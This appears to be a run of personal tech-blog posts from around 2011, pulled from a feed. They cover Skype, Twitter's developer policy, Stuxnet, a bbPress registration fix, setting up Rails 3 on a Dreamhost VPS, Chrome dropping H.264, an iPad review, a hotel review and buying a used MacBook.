<p>I use Skype on a daily basis, and for me this brings back memories of AOL&#8217;s <a href="http://www.slate.com/id/2109615/">failed</a> acquisition of Nullsoft (the maker of WinAmp) in 1999, which took a great piece of software and a well-respected brand, and rendered it little better than RealPlayer (and don&#8217;t get me started on the <a href="http://money.cnn.com/1998/11/24/technology/aol/">Netscape acquisition</a>). I can see this easily going down the same path; as the brand is diluted and merged with others to help boost their marketing goals, and the software is integrated tightly with other products (creating that tight, but invasive feel that the EU had so many issue with when they did it with IE); they could easily find themselves in the same position that <a href="http://www.businessweek.com/technology/content/oct2007/tc2007101_499889.htm">eBay did back in 2007</a>.</p>

<p>Microsoft desperately needs to build their online brand to recover the <a href="http://techcrunch.com/2011/04/29/microsoft-internet-bloodbath/">billions that they are losing</a>, and I have to assume they see Skype as a key player in this quest; the question is can the keep their newly acquired user-base from jumping ship.</p>

<p>I don&#8217;t think Skype will live or die on technology at this point, I think PR is a far larger issue for them right now.</p>

      <title>You can&#39;t fix stupid&#8230;</title>
      <description><p>For those outside of the IT field, developers are looked at as miracle workers - through us, business leaders think anything is possible (and they often see no reason why we can&#8217;t work our latest miracle by the next morning). In reality though, we do work miracles; we save companies vast amounts of money every year through increased worker efficiency and automation, we enable new lines of business that wouldn&#8217;t be possible otherwise, and reduce energy costs because we keep the office lights turned off. Well, that&#8217;s more or less how they see us.</p>

<p>But for all of the wonders we are responsible for, there is one thing we can&#8217;t do (no matter what amazing powers some executives <em>think</em> we have to make them look better or earn them more bonuses):</p>

<p><strong>You can&#8217;t fix stupid.</strong></p>

<p>I&#8217;ve often described development as being a professional problem solver, and we are often tasked with rather challenging problems to solve. Sometimes the problems are purely technical - making something new possible that previously was impracticable or even impossible, sometimes it&#8217;s all about efficiency, other times it&#8217;s about image and controlling how people see a company. When the problem is the user though, you know you&#8217;re in for a rough day.</p>

<p>I was recently given such a task - the users weren&#8217;t listening to their supervisors and they wanted the software to force these users to do whatever it was that management told them they should be doing. I was given less than a week to find ways to make people that don&#8217;t want to work, work.</p>

<p>Basically, users fall into three simple categories:</p>

<ul>
<li><p>Power Users - these users understand software, and require little, if any instruction - more than anything, you give these users a tool and stay out of their way.</p></li>
<li><p>Average Users - odds are, your mother or father falls into this category. They understand enough to get by, and with a little instruction they should have no trouble.</p></li>
<li><p>Idiots* - odds are, you work with one of these users. You lead them by they hand, and show them exactly what to do - just in time for the boss to walk by and praise them for doing a good job (and 10 minutes later you find them playing in traffic, somehow defying <a href="http://en.wikipedia.org/wiki/Survival_of_the_fittest">Darwin</a> in the process).</p></li>
</ul>


<p>For users of the last category, there&#8217;s just not much you can do.</p>

<p>I always do my due diligence while building software; doing all I can to make it simple to use, flexible, and forgiving of user error. I always use extensive data validation, carefully worded instructions and dialogs, and do my best to follow the various best-practice guides for UI and UX; yet for all this effort and design - I can&#8217;t write software that thinks for people or makes judgement calls based on business rules that only they know (probably because they make it up as they go).</p>

<p>No matter how helpful or intelligent an application is, or how idiot-proof you think you&#8217;ve made it, reality is that you simply can&#8217;t fix stupid - you can&#8217;t take an incompetent person that refuses to think for themselves and turn them to into a great, productive asset. After years in this industry (which has made me just a little cynical [in the way that <a href="http://en.wikipedia.org/wiki/Sun">Sol</a> only seems little when compared to <a href="http://en.wikipedia.org/wiki/Betelgeuse">Betelgeuse</a>]), I&#8217;ve come to understand something rather disturbing: idiots keep getting better.</p>

<p><em>Somewhere, right now, idiots are working to build even better idiots - and that&#8217;s a really scary thought.</em></p>

<p>We can make a user more efficient by automating tasks, providing better information, or helping to manage their workload - what we can&#8217;t do is make them smarter, make them think through their actions, or force them to do what their managers tell them. Yet we are, at least on occasion, asked to fix this problem.</p>

<p>Despite our best efforts as professionals and passionate developers; if a user won&#8217;t think - we just can&#8217;t fix it.</p>

<ul>
<li><ul>
<li>I define an idiot about the same way I do someone that&#8217;s lazy; they have no medical issues or legitimate handicap. They just don&#8217;t want to think or work (probably both). Those that are handicap or have learning or medical issues are a very different story and not the target of this article; I donated time and services to charities that served the disabled for a number of years, I highly recommend that all developers do it - it&#8217;s a very rewarding experience to see your work make somebody&#8217;s life better and it teaches you quite a bit about how people interact with technology.</li>
</ul>
</li>
</ul>

      <title>Hosting Change</title>
      <description><p>I&#8217;m in the process of migrating my sites from  a <a href="http://www.dreamhost.com/hosting-vps.html">Dreamhost VPS</a>, to fully managed hosting by <a href="http://www.grayhills.com/">Gray Hills Software</a>. In my tests so far, the loading time has been cut in half with this switch. Pages load faster, the server is better configured (new software, and more options), and seeing as they have both Windows and Linux servers, I can use one provider with whatever technology suits me and my projects.</p>

<p>There may be a few bumps as I move things, but all should stable soon.</p>

      <title>TED: Stuxnet: a preview of future wars</title>
      <description><p><a href="http://www.langner.com/en/">Ralph Langner</a> recently spoke at TED about his team&#8217;s findings on <a href="http://en.wikipedia.org/wiki/Stuxnet">Stuxnet</a>; it&#8217;s a clear (and somewhat scary) insight into the wars of the future. Instead of sending fighters and bombers to take out <a href="http://articles.cnn.com/2010-09-29/world/iran.cyberattack_1_nuclear-program-bushehr-nuclear-plant-malware?_s=PM:WORLD">Iran&#8217;s nuclear program</a>, as was done in 1981 to eliminate <a href="http://en.wikipedia.org/wiki/Operation_Opera">Iraq&#8217;s program</a>, a carefully crafted virus slowly and methodologically damaged or destroyed vital equipment.</p>

<p>How long until this is used as a standard part of &#8216;softening&#8217; a target by taking out key infrastructure (flight systems, power plants, telephone &amp; internet, etc.) before the bombs start to fly?</p>

<p>For those of us that have a professional interest in security, understanding the threats both present and future is simply a necessity.</p>

<p>This is a must watch.</p>

      <title>&#8230;and thanks for the fish (Twitter v. Developers)</title>
      <description><p>On March 11, 2011, Twitter said goodbye to some of it&#8217;s most loyal and passionate users.</p>

<p>In a message on their <a href="http://groups.google.com/group/twitter-development-talk">Development Talk</a> group entitled &#8221;<a href="http://groups.google.com/group/twitter-development-talk/browse_thread/thread/c82cd59c7a87216a#">consistency and ecosystem opportunities</a>&#8221; - they make their position clear: we no longer need you. To demonstrate this, let me point out a couple quotes that deserve attention:</p>

<p>_Twitter will provide the primary mainstream consumer client experience on phones, computers, and other devices by which millions of people access Twitter content (tweets, trends, profiles, etc.), and send tweets.
_</p>

<p>and this gem:</p>

<p><em>More specifically, developers ask us if they should build client apps that mimic or reproduce the mainstream Twitter consumer client experience.  <strong>The answer is no.</strong></em></p>

<p>Independent, 3rd-party developers have driven the progression of Twitter from an extremely simplistic <a href="http://techcrunch.com/2006/07/15/is-twttr-interesting/">group SMS</a> service, to a massive and near ubiquitous communications system used by millions of people.  As Twitter fought whales and struggled to keep servers running, outside developers were busy building new and better ways of using the service; now that Twitter has gone mainstream and is doubtlessly looking at revenue options, they&#8217;ve told these passionate users that they are no longer needed. The users that evangelized the service, and promoted it in countless ways, suffering through long stretches of downtime remained loyal and energized, pushing the service to become ever more. Twitter, it seems, has no such loyalty to these champions and flag bearers of the service.</p>

<p>If you want to build an application in the Twitter ecosystem now, you are pushed to the outskirts; building integration as a feature of a separate system (such as <a href="http://instagr.am/">instagram</a>), or building for vertical markets which by definition have a far more limited market potential. This is a dangerous time to be invested in an application that relies too much on Twitter; there&#8217;s no telling what or who they will ban next.</p>

<p>Twitter did make it fairly clear that existing applications can &#8220;continue to serve your user base&#8221; - there was an air of a threat in the statement, and given their willingness to <a href="http://techcrunch.com/2011/02/18/twitter-suspends-ubermedia-clients-ubertwitter-and-twidroyd-for-violating-policies/">ban a major player</a>, I can&#8217;t help but think that they will be looking for chances to kill off other clients, to further solidify their control of what users see.</p>

<p><em>If you are an existing developer of client apps, you can continue to serve your user base, but we will be holding you to high standards to ensure you do not violate users’ privacy, that you provide consistency in the user experience, and that you rigorously adhere to all areas of our Terms of Service.</em></p>

<p>At best Twitter has alienated passionate users, at worst they have inspired new competition with the goal of being what many of these users wanted Twitter to become, before they shifted their strategy away from the core service, to controlling and enforcing a sub-par user experience.</p>

      <title>bbPress &amp; WordPress 3.1 (Registration Issues)</title>
      <description><p>While building a new website for a small ISV, I was asked to integrate a forum - should be simple I thought, I&#8217;ll just use WordPress as a CMS and <a href="http://bbpress.org/">bbPress</a>. Simple? Not quite.</p>

<p>To make things easier, I used <a href="http://www.pagelines.com/themes/platformpro/">Platform Pro</a> by Pagelines (a great platform IMHO) and so used their &#8220;deep integration&#8221; <a href="http://www.pagelines.com/docs/bbpress-forums">instructions</a> (while they are intended for Platform Pro users, the steps are virtually identical for all other setups). While the setup went quite smoothly, it wasn&#8217;t until it came time to test user registrations that the issue came up: when a new user tried to register they would receive an error stating that &#8220;email is required,&#8221; even if they had entered a valid email address. This effectively made it impossible for users to register, and thus made the forum useless.</p>

<p>After a bit of research, it looks like there is a conflict between newer versions of WordPress (3.0+) and bbPress 1.0.2 (I&#8217;m not sure if older versions have the same issue, but I would assume so). The fix for this is actually quite simple: install a <a href="http://bbpress.org/plugins/topic/zaerl-wordpress-3-integration/">plugin</a>. The plugin itself is quite simple - containing only around a half-dozen executable lines of code, and works around the issue with a simple hack.</p>

<p>Unfortunately, the plugin description is rather vague and required a fair bit of research to identify as the fix, and the official documentation makes no reference to the issue or that this plugin can be used as a workaround.</p>

<p>Overall, a simple workaround but a major issue if you don&#8217;t notice that it&#8217;s broke (as is quite easy to do).</p>

      <title>Need a cheap phone charger quick? Buy a Tracfone.</title>
      <description><p>I recently discovered that I had left the changer for my BlackBerry Tour behind (I&#8217;m in the process of moving, and left my changer at the old house), and needed a new one that night. So being late in the evening, my only option was a trip to the local Wal-Mart were I found the typical cheap off-brand charger for a somewhat pricey $15.</p>

<p>Had the quality been better, I wouldn&#8217;t have given it a second thought - but I&#8217;ve purchased a number of those changers in the past and they are poorly made and it never fails that they break within a few months.</p>

<p><img src="http://adamcaudill.com/files/2011/02/lg420g-114x150.jpg" alt="" /></p>

<p>Looking around I noticed a Tracfone package on the shelf that included a LG420G phone, a micro-USB wall charger (LG branded), a micro-USB car charger, and some other things (phone case, etc.), and all for <strong><em>$15</em></strong>. So for the same price as the cheap off-brand charger, I could get both a car and wall charger (both of better quality than the off-brand that Wal-Mart sells).</p>

<p>So it&#8217;s a better deal to by a cheap pre-paid phone and toss the phone than it is to just buy the charger. Kinda crazy, but true.</p>

      <description><p>I recently had an idea for a small web application, and seeing as I&#8217;ve not spent as much time as I&#8217;ve wanted to using <a href="http://rubyonrails.org/">Rails</a> - I opted to build it the latest version of Rails. A decision that caused far more grief than I expected.</p>

<p>If you are using <a href="http://www.dreamhost.com/r.cgi?485850">Dreamhost&#8217;s</a> PS offering (a managed VPS for those that don&#8217;t know), the seemingly simple task of getting a Rails 3 application up and running is actually quite complex. The root cause of this is that Dreamhost&#8217;s OS image is based on Debian <a href="http://www.debian.org/releases/etch/">etch</a>, which was released in April 2009 and has since been replaced; which means etch has become fairly outdated.</p>

<p>Here&#8217;s the process I used, and so far it seems to be working quite well:</p>

<p><strong>Domain Setup:</strong></p>

<p>When adding your domain to the Dreamhost panel, you&#8217;ll want to enable <a href="http://wiki.dreamhost.com/Passenger">Passenger</a>.</p>

<p><img src="http://adamcaudill.com/files/2011-01-28_0048.png" alt="" /></p>

<p>Once your application is uploaded to the server, you&#8217;ll be greeted with a particularly unhelpful error message (something like <code>uninitialized constant Bundler</code>) from Passenger (or perhaps just a 500 error page).</p>

<p><strong>Server Updates:</strong></p>

<p>This is where the work starts, and gets somewhat ugly. As a warning, it&#8217;s quite possible that you could damage your configuration doing this; though thankfully you can <a href="https://panel.dreamhost.com/index.cgi?tree=vserver.reboot&amp;">restore</a> your server to a working state within a few minutes from the Dreamhost panel should something go wrong. You&#8217;ll also need to have an <a href="https://panel.dreamhost.com/index.cgi?tree=vserver.adminusers&amp;">admin user</a> for this task, as much of what needs to be done has to be done as root.</p>

<p>First step: Get your PS up to date; even after performing a restore on my server, there were a number of updates that are available to be installed. So let&#8217;s start off by getting those out of the way.</p>

<pre><code>sudo apt-get update
sudo apt-get upgrade
sudo apt-get -f install
</code></pre>

<p>Once you get past those three commands, the next step is to update SQLite to the latest version, as the version Dreamhost uses is quite old and won&#8217;t work with Rails 3.0 (well, to be accurate it won&#8217;t work with the latest version of sqlite3-ruby, which is the default database provider for Rails 3).</p>

<pre><code>wget http://www.sqlite.org/sqlite-autoconf-3070400.tar.gz
tar zxvf sqlite-autoconf-3070400.tar.gz
cd sqlite-autoconf-3070400
sudo ./configure --bindir=/usr/bin --libdir=/usr/lib
sudo make
sudo make install
</code></pre>

<p>If you don&#8217;t update SQLite you&#8217;ll get an error like this:</p>

<pre><code>sudo gem install sqlite3
Building native extensions.  This could take a while...
ERROR:  Error installing sqlite3:
    ERROR: Failed to build gem native extension.

/usr/bin/ruby1.8 extconf.rb
checking for sqlite3.h... yes
checking for sqlite3_libversion_number() in -lsqlite3... yes
checking for rb_proc_arity()... no
checking for sqlite3_initialize()... no
sqlite3-ruby only supports sqlite3 versions 3.6.16+, please upgrade!
*** extconf.rb failed ***
</code></pre>

<p>or if you install the updated version, but don&#8217;t force it to <code>/usr/lib</code> you&#8217;ll get an error like this:</p>

<pre><code>sudo gem install sqlite3
Building native extensions.  This could take a while...
ERROR:  Error installing sqlite3:
    ERROR: Failed to build gem native extension.

/usr/bin/ruby1.8 extconf.rb
checking for sqlite3.h... yes
checking for sqlite3_libversion_number() in -lsqlite3... no
sqlite3 is missing. Try 'port install sqlite3 +universal' or 'yum
install sqlite3-devel'
*** extconf.rb failed ***
</code></pre>

<p>Once that is taken care of SQLite, the rest is easy.</p>

<pre><code>sudo gem update
</code></pre>

<p>At this point if you visit your new Rails site, it <em>should</em> be working!</p>

<p>Notes:</p>

<ol>
<li><p>I&#8217;ve not tested this extensively, and I&#8217;ve no idea if this breaks anything. All I can say for certain, if that all of <em>my</em> sites still work, but your mileage may vary. <Disclaimer /></p></li>
<li><p>I was a fairly early Dreamhost PS adopter, and part way through this process I reset my server to get it back to a clean state. After resetting, I noticed some differences with the behavior of <code>apt-get</code> (404s on <code>update</code> and <code>upgrade</code> are gone), so for other early adopters it may be necessary to perform a reset to get your servers configuration in-sync with the latest official setup.</p></li>
<li><p>I can&#8217;t say for a fact that this is completely necessary, though you&#8217;ll likely need to selectively update a few packages if you skip this step. Also, for me, <code>gem</code> was broken until I ran <code>sudo apt-get -f install</code>.</p></li>
<li><p>Special thanks to <a href="http://matthewjlittle.com/">Matt</a> for helping me get this working; troubleshooting the SQLite install was more than a little time consuming.</p></li>

      <title>Google Chrome and H.264</title>
      <description><p>In a somewhat (but not entirely) surprising <a href="http://blog.chromium.org/2011/01/html-video-codec-support-in-chrome.html">announcement</a>, Google is removing support for <a href="http://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">H.264</a> video from Chrome. This change to their implementation of the often controversial HTML5 <code>&lt;video&gt;</code> tag is both a major step by Google and a furtherance of the already complicated world of video online.</p>

<p><em>&#8230; To that end, we are changing Chrome’s HTML5  support to make it consistent with the codecs already supported by the open Chromium project. Specifically, we are supporting the WebM (VP8) and Theora video codecs, and will consider adding support for other high-quality open codecs in the future. Though H.264 plays an important role in video, as our goal is to enable open innovation, <strong>support for the codec will be removed</strong> and our resources directed towards completely open codec technologies.</em></p>

<p>When Google <a href="http://techcrunch.com/2010/05/19/webm-google-h-264/">released</a> <a href="http://www.webmproject.org/">WebM</a> (a royalty-free codec which Google <a href="http://techcrunch.com/2009/08/05/google-acquires-video-compression-technology-company-on2-for-106-million/">acquired</a> as part of On2), it was clear that the intention was to take on H.264 and with this move there seems little doubt that the gauntlet has been thrown down. Although, now that H.264 has such a <a href="http://techcrunch.com/2010/05/01/h-264-66-percent-web-video/">strong base</a> (it&#8217;s included in <a href="http://www.adobe.com/aboutadobe/pressroom/pressreleases/200712/120407adobemoviestar.html">Flash</a>, <a href="http://blogs.msdn.com/b/ie/archive/2010/04/29/html5-video.aspx">IE9</a>, Safari, Mobile Safari, and Android), it really makes one wonder if Google has picked a fight that has long since been lost.</p>

<p><strong>So why would Google do this?</strong></p>

<p>Here&#8217;s my best guess: Money (specifically, patent licensing).</p>

<p>H.264 is heavily encumbered by numerous patents owned by companies like Microsoft, Apple, and Cisco, and controlled by <a href="http://www.mpegla.com/main/default.aspx">MPEG LA</a>, the consortium charged with turning these patents into profit (<a href="http://www.mpegla.com/main/programs/avc/Documents/avc-att1.pdf">here&#8217;s</a> the 70 page list of patents for those interested). While I&#8217;m sure many people recall that MPEG LA made a very public pledge that H.264 would be <a href="http://gigaom.com/video/mpeg-la-h-264-streaming-will-be-free-forever/">free forever</a>, as is often the case, things aren&#8217;t quite that simple.</p>

<p><a href="http://www.blogger.com/profile/06696465857424753507">Peter Csathy</a> wrote a fairly <a href="http://digitalmediaupdate.blogspot.com/2010/09/think-h264-is-now-royalty-free-think.html">detailed post</a> on the matter, pointing out some key details that many in the media skipped. Here&#8217;s the core of what wasn&#8217;t discussed after the MPEG LA announcement (but should have been):</p>

<p><em>But, you say, MPEG LA recently announced that it will no longer charge royalties for the use of H.264. Yes, it’s true – MPEG LA recently bowed to mounting pressure from, and press surrounding, WebM and announced something that kind of sounds that way. But, I caution you to read the not-too-fine print. H.264 is royalty-free only in one limited case – for Internet video that is delivered free to end users. Read again: <strong><strong>for (1) Internet delivery that is (2) delivered free to end users</strong></strong>. In the words of MPEG LA’s own press release, “Products and services other than [those] continue to be royalty-bearing.”</em></p>

<p><a href="http://shaver.off.net/diary/">Mike Shaver</a>, Mozilla&#8217;s VP of Engineering offer&#8217;s a somewhat similar take in &#8221;<a href="http://shaver.off.net/diary/2010/08/27/free-as-in-smokescreen/">Free as in Smokescreen</a>:&#8221;</p>

<p><em>What MPEG-LA announced is that their current moratorium on charging fees for the <strong>transmission of H.264 content</strong>, previously extended through 2015 for uses that don’t charge users, is now permanent. You still have to pay for a license for H.264 if you want to make things that create it, consume it, or your business model for distributing it is direct rather than indirect.</em></p>

<p><em>What they’ve made permanently free is distribution of content that people have already licensed to encode, and will need a license to decode. This is similar to Nikon announcing that they will not charge you if you put your pictures up on Flickr, or HP promising that they will never charge you additionally if you photocopy something that you printed on a LaserJet.</em></p>

<p>I&#8217;m just waiting for one of the licensors to reinterpret the license and claim that ads constitute a form of payment or some similar excuse to exclude them from the exception they granted. I&#8217;ve yet to get my hands on the latest licensing agreement to see exactly what it says about this, but I wouldn&#8217;t be surprised at all to see this card played at some point to wring extra revenue from these patents.</p>

<p>Given that Google owns the massive video sharing site YouTube, which <a href="http://youtube-global.blogspot.com/2010/01/introducing-youtube-html5-supported.html">uses H.264</a>, plus whatever unknown projects relating to <a href="http://www.google.com/tv/">Google TV</a> - it stands to reason that Google would certainly save some money by moving away from such an encumbered technology; not to mention avoid future risk should rules change. Though personally, I also have to wonder if it could be fears of a repeat of the <a href="http://burnallgifs.org/archives/">GIF patent</a> debacle.</p>

<p><strong>Now where does this leave us?</strong></p>

<p>Right now HTML5 <code>&lt;video&gt;</code> is a mess, at best. There is a war for which codec becomes the de facto standard, and there is a <em>lot</em> of money at stake depending on who wins. At this point there is no single codec that works across all major browsers; to get full coverage the best option now looks to be a combination of H.264, WebM, and Flash. Doesn&#8217;t really sound like the progress that was promised with HTML5 does it?</p>

<p>It&#8217;s worth noting though that Google isn&#8217;t the first browser developer to reject H.264; both <a href="http://shaver.off.net/diary/2010/01/23/html5-video-and-codecs/">Firefox</a> and <a href="http://my.opera.com/core/blog/2009/12/31/re-introducing-video">Opera</a> have decided against including it in their browsers as well. As painful as the fragmentation is now in regard to who supports what, this move by Google actually does little to change the landscape. Support has been fragmented from the beginning, and all this really does it push H.264 a step away from being the de facto standard; a title that it has been very close to seizing.</p>

<p>Had Firefox added support for H.264, I think the fight would be over and would have made today&#8217;s announcement almost suicidal for the project. Though with such a major player holding out against it, Google&#8217;s move becomes a minor tactical shift in the short-term (though the long-term impact could be significant).</p>

<p>I could go on for pages about what works are where we are now, but <a href="http://diveintomark.org/">Mark Pilgrim</a> (an infinitely better writer than I) sums it all up here: &#8221;<a href="http://diveintohtml5.org/video.html#what-works">Dive into HTML5: Video on the Web</a>&#8221; - well worth reading if you want to really understand what&#8217;s going on.</p>

<p>So in summary - video needs to be encoded to multiple formats, which today&#8217;s announcement does little to alter due to the fragmentation that was already in place. In the long run, WebM may be better for the community due to its license, though many of the internet&#8217;s biggest players have a vested interest in H.264. So when you factor in politics and propaganda between competing companies, distrust, and possible patent claims that haven&#8217;t been addressed yet; this all leads me to an even simpler summary:</p>

<p>Yesterday, HTML5 <code>&lt;video&gt;</code> was a mess; tomorrow it will still be a mess.</p>

      <title>Thoughts on the iPad, from an Apple hater</title>
      <description><p>Before I get started, let me make a couple of things clear:</p>

<ol>
<li><p>Apple is evil; pure and simple. I&#8217;m fully convinced that Steve Jobs has weekly planning meetings with <a href="http://en.wikipedia.org/wiki/Lucifer">Lucifer</a> himself1.</p></li>
<li><p>Apple&#8217;s policies are anti-everybody. From bloggers to developers2, Apple seems to make life as hard as possible for those that use their products for profit.</p></li>
</ol>


<p>With these facts in mind, I tend to shy away from their products when I have a choice (which isn&#8217;t always <a href="http://shadowofthebat.com/2010/12/05/buying-a-macbook-from-cowboom-com/">the case</a>); though a while back I decided to buy an iPad for some reason. I&#8217;ve wanted a tablet for quite some time, and despite my hopes of there being a Microsoft-based solution that would do what I needed, there wasn&#8217;t anything announced that had the features I wanted in a price range that I could justify.</p>

<p>When I first powered it up and was met by that familiar instruction to connect to iTunes, I was really questioning the wisdom of buying an Apple product. But, I took a deep breath, installed iTunes and took the plunge.</p>

<p>That was about 3 months ago, and I no longer question the wisdom – it was a great purchase, and has become a key part of how I work. Between my favorite applications (<a href="http://itunes.apple.com/us/app/evernote/id281796108?mt=8">Evernote</a>, <a href="http://itunes.apple.com/us/app/penultimate/id354098826?mt=8">Penultimate</a>, <a href="http://itunes.apple.com/us/app/ia-writer/id392502056?mt=8">iA Writer</a>, and <a href="http://itunes.apple.com/us/app/dropbox/id327630330?mt=8">Dropbox</a>), I&#8217;ve been able to streamline my workflow, keep better notes, and keep the information that I need available – no matter when or where I need it.</p>

<p>The device itself is <a href="http://en.wikipedia.org/wiki/Genius_(mythology">ingeniously</a>) designed, with Apple&#8217;s typical focus on simplicity first and foremost. It has a ~10-hour battery life ensures that you&#8217;ll make it through the work day (and probably with enough left to do some reading after work); though your PC probably won&#8217;t be able to <a href="http://support.apple.com/kb/HT4060">charge it</a>. The only thing missing from a hardware perspective is a &#8216;back&#8217; button, as I would quite likely use that more than the &#8216;home&#8217; button.</p>

<p>I was quite concerned initially that it would be like so many other devices and gadgets that I&#8217;ve acquired other the years, interesting for a couple of weeks then doomed to spend the rest of its life buried in one of my &#8216;junk&#8217; boxes. Within the first few hours I was sure that wouldn&#8217;t be its fate; far from it. At this point I rarely leave home without it, even if only going shopping. While I do still rely on my Moto DROID for a number of things, I&#8217;ve found that the iPad does a much better job at serving most of the roles my phone was once responsible for.</p>

<p>For example, I&#8217;m a huge fan of <a href="http://www.evernote.com/">Evernote</a> – it&#8217;s by far my favorite service and I access it from every device I have. Prior to the iPad I often took notes on the DROID to avoid having to use hand-written notes that would need to be transcribed later; thanks to its small screen and tiny keyboard my notes were as terse as I could get them, often missing details I later wished I had. With the large screen and large, better designed keyboard of the iPad, I&#8217;ve found my notes are now clearer and more detailed – exactly what I need them to be.</p>

<p>A friend of mine who bought one shortly after they came out referred to it as a media consumption device, not suited for work or anything serious. While this is what I expected, it&#8217;s not what I found; it&#8217;s a great media player (despite the lack of a 16:9 screen) and thanks to the <a href="http://itunes.apple.com/us/app/kindle/id302584613?mt=8">Kindle</a> application, it&#8217;s also a very good e-reader, but with the right applications it has a strong business side as well.</p>

<p>What I feared would be a toy relegated to the abyss of abandoned gadgets has turned into a key tool helping me keep my chaotic life in order.</p>

<p>1Before anybody says anything, yes, this is just a joke.
2While Apple has made a lot of <a href="http://www.mobilecrunch.com/2010/09/09/apple-opens-app-store-to-other-development-platforms-publishes-review-guidelines/">progress</a> in opening up and making rules more clear, though they could still do better.</p>

      <title>Rosen Shingle Creek</title>
      <description><p>I recently had a great idea; a trip down to Florida to visit family and celebrate our second anniversary - the idea turned out to be a bit less great than I had hoped. Of the seven days we were there, on three the wind-chill was less than 40F. On the upside, I had booked a room at a newer (opened in 2006) 4-star hotel; if we&#8217;re going to be stuck inside, no reason not to be in a great room.</p>

<p>The hotel was <a href="http://www.rosenshinglecreek.com/">Rosen Shingle Creek</a>, a rather large (1,500 rooms plus a 450,000 sq. ft. conference area) and quite impressive facility. The view as you drive up to the main entrance is most impressive; 14-stories tall and inspired by <a href="http://en.wikipedia.org/wiki/Spanish_Colonial_Revival_architecture">Spanish Colonial Revival</a> architecture that was so popular in Florida during the early 1900s. As you approach the hotel, you&#8217;ll notice that the driveway is offset to the left to enhance the initial impression.</p>

<p><a href="http://www.flickr.com/photos/26686573@N00/4693535920/"><img src="http://farm5.static.flickr.com/4016/4693535920_4e031719ea.jpg" alt="" /></a></p>

<p>The rooms are well-appointed, and well designed. The use of art by a local photographer (which is featured throughout the hotel) seems, to me at least, far better than the random paintings and abstract art I&#8217;ve seen at most other hotels I&#8217;ve been to recently. As would be expected from a 4-star hotel, the beds are comfortable; though personally I believe that the beds at the nearby <a href="http://www.renaissanceseaworldorlando.com/">Renaissance Orlando at SeaWorld</a> are far superior.</p>

<p>The hotel&#8217;s public spaces are nearly as impressive as its exterior appearance, with abundant marble and stonework, and large open spaces. It is certainly an upscale hotel, and you are reminded of that fact each and every step of the way.</p>

<p>Though with this praise, there are a few things I really didn&#8217;t care for:</p>

<ul>
<li><p>Parking: Valet parking is a steep $20/day; there is the option to self-park for $12/day, but in the evening the parking lot fills quickly. If the thought of walking close to a half-mile at the end of a long day walking around theme parks seems like a bad idea, then I would avoid the self-parking.</p></li>
<li><p>Internet: The lack of in-room Wi-Fi is (in my opinion) inexcusable for such a new hotel. Between my wife and me, there were three laptops and two iPads; so a single wired internet connection just doesn&#8217;t cut it. I don&#8217;t mind paying the $13/day they change for internet access (well, I do mind, but there&#8217;s little choice but to live with it), but I need to be able to use it the way I want to use it. In a world where more and more devices come with Wi-Fi built-in, there&#8217;s no reason for any hotel to not provide in-room Wi-Fi access.</p></li>
<li><p>Cleaning: The room was nearly spotless when we arrived (and what little was missed was quite excusable), and the daily cleaning was always courteous and thorough. Some other areas though, didn&#8217;t receive the same level of attention. For example, the in the hallway leading to our room there were scraps of paper and other debris on the floor for almost the entire time we were there. Not a huge deal, but if they only vacuum the hallway once a week – what else are they not doing right?</p></li>
<li><p>Tips: I don&#8217;t mind tipping for good service (and I tend to be more generous than most), but I can&#8217;t stand people who demand tips. I&#8217;ve not seen people push for tips like that in a long time.</p></li>
</ul>


<p>Overall, it&#8217;s a nice hotel and I wouldn&#8217;t suggest avoiding it; though there are better hotels in the area.</p>

      <title>Buying a MacBook from CowBoom.com</title>
      <description><p>I have a project coming up that will require some iOS development – which means that it has to be done on a Mac. Seeing as I didn&#8217;t own a Mac, and as the more I spent on acquiring one, the less money from this project will end up in my pocket; I needed a cheap solution. In the end I acquired a very nice 13&#8221; MacBook from CowBoom.com; so this is both about the deals that are available and a review of my experience with the seller.</p>

<p>The Options:</p>

<ul>
<li><p>Retail: It is well-known that Apple rarely allows discounts; and when they do permit them, they are typically small. It&#8217;s possible to save a few dollars by buying through Amazon (i.e. <a href="http://www.amazon.com/Apple-MacBook-MC516LL-13-3-Inch-Laptop/dp/B002C7489S/">here</a>) or the like, but the savings is likely to be in the 5% range.</p></li>
<li><p>Hackintosh: For those not familiar, a hackintosh is a PC running a modified version of OS X to bypass hardware restrictions. Lifehacker has a great <a href="http://lifehacker.com/5672051/how-to-build-a-hackintosh-mac-and-install-os-x-in-eight-easy-steps">hackintosh guide</a>that details all of the steps and hardware necessary to get it all working. Per the Lifehacker guide, it&#8217;s a little over $900 once you figure in sales tax (if you&#8217;re unlucky enough to live in TN as I do); by switching out a few parts (case, power supply, HDD), the price with taxes drops to a little over $800. This though, has a few issues:</p>

<ul>
<li><p>Legality: Doing this violates the OS X license agreement, which is kinda significant.</p></li>
<li><p>Support: There is none, period. Your best bet is posting to forums and hoping that others have seen the issue before.</p></li>
<li><p>Consistency: Seeing as these boxes run a modified kernel, it&#8217;s possible that these modifications could lead to inconsistent behavior between them and a real Mac; when you are writing software, this could be a big deal.</p></li>
<li><p>Updates: Apple has already intentionally <a href="http://osxdaily.com/2009/10/31/hackintosh-netbook-users-take-note-snow-leopard-10-6-2-update-kills-support-for-atom-processor/">broken</a>support for Intel Atom processors to combat Hackintosh Netbooks which were becoming quite popular. You never know what they&#8217;ll try to break in future updates.</p></li>
<li><p>Hardware: Seeing this isn&#8217;t a supported configuration, hardware support is iffy at best. You have to carefully select what hardware will be used; ideally duplicating someone else&#8217;s tested and confirmed-working build.</p></li>
</ul>
</li>
<li><p>eBay: I spent the better part of a weekend looking through hundreds of listings; researching specs and features, comparing prices, and analyzing feedback. As is expected with eBay, there&#8217;s a bit of everything: items beat to death, broken, way overpriced, or great deals that get snapped up almost as soon as you see them. The only thing missing is any form of consistency.</p></li>
<li><p>Craigslist/etc.: Quite similar to eBay, except with somewhat better prices and fewer choices.</p></li>
</ul>


<p>After pouring way too many hours into the search, I ran across a post on slickdeals.net mentioning that CowBoom.com had a <a href="http://www.cowboom.com/product/715713">good deal</a> on them. I&#8217;d never heard of them, and thinking them to be something of a joke thanks to the terrible name (my odd hatred of cows notwithstanding), but given the lack of progress – off I went to do some research. It turns out ta CowBoom was <a href="http://www.auctionbytes.com/cab/abn/y10/m04/i12/s01">developed</a> by Dealtree, which BestBuy acquired in 2008; if it wasn&#8217;t for the fact that there are backed by a major player, I would have just went on and ignored them.</p>

<p>Dealtree is effectively the liquidation arm of BestBuy, responsible for converting returns, damaged items, and the like into cash via different outlets; the better items go to CowBoom to be sold or auctioned.</p>

